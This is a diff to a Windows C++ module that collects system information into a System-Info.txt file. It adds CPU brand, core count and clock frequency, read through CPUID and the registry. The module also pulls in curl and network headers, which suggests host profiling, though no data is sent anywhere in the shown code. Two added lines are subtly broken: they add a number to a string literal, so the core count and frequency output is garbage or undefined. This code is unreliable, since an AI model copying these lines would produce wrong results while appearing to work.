@@ -32,6 +32,10 @@
 #include <sstream>
 #include <iphlpapi.h>
 #include <curl\curl.h>
+#include <tchar.h>
+#include <intrin.h>
+
+#pragma comment(lib, "wbemuuid.lib")
 #include <VersionHelpers.h>
 
 
@@ -61,11 +65,15 @@ namespace global
 /// </summary>
 void GetGeneralInfo();
 
+void CPU();
+
+std::string GetCPUType();
+
 std::string GetWindowsOSType();
 
 void cursystem::GetSysInfo()
 {
-	printf("sys info");
+	printf("sys info\n");
 
 	TCHAR string[UNLEN + 1];
 	DWORD sizeit = UNLEN + 1;
@@ -76,6 +84,7 @@ void cursystem::GetSysInfo()
 	std::string mainPath = "C:/Users/" + userName + config::path + "/System-Info/System-Info.txt";
 
 	GetGeneralInfo();
+	CPU();
 
 
 	std::ofstream file(mainPath, std::ios::app);
@@ -230,5 +239,62 @@ std::string GetWindowsOSType() {
 	else {
 		return "Unknown Windows version";
 	}
+
+}
+
+void CPU()
+{
+	// Get the CPU type
+	std::string cpuType = GetCPUType();
+	global::info += "\n\nCPU Type: " + cpuType + '\n';
+
+	// Get the number of CPU cores
+	SYSTEM_INFO sysInfo;
+	GetSystemInfo(&sysInfo);
+	DWORD numCores = sysInfo.dwNumberOfProcessors;
+	global::info += "Number of CPU Cores: " + numCores + '\n';
+
+	// Get the maximum CPU frequency
+	HKEY hKey;
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+		DWORD freqValue;
+		DWORD freqSize = sizeof(freqValue);
+		if (RegQueryValueEx(hKey, _T("~MHz"), NULL, NULL, reinterpret_cast<LPBYTE>(&freqValue), &freqSize) == ERROR_SUCCESS) {
+			global::info += "Maximum CPU Frequency: " + freqValue + std::string(" MHz") + '\n';
+		}
+
+		RegCloseKey(hKey);
+	}
+
+}
+
+
+std::string GetCPUType() 
+{
+
+	    std::string cpuType;
+
+    int cpuInfo[4] = { -1 };
+    char cpuBrandString[0x40] = { 0 };
+
+    // Check if the CPUID instruction is supported
+    __cpuid(cpuInfo, 0x80000000);
+    unsigned int nExIds = cpuInfo[0];
+
+    // Get the CPU brand string
+    for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
+        __cpuid(cpuInfo, i);
+
+        if (i == 0x80000002)
+            memcpy(cpuBrandString, cpuInfo, sizeof(cpuInfo));
+        else if (i == 0x80000003)
+            memcpy(cpuBrandString + 16, cpuInfo, sizeof(cpuInfo));
+        else if (i == 0x80000004)
+            memcpy(cpuBrandString + 32, cpuInfo, sizeof(cpuInfo));
+    }
+
+    cpuType = cpuBrandString;
+
+    return cpuType;
 
 }
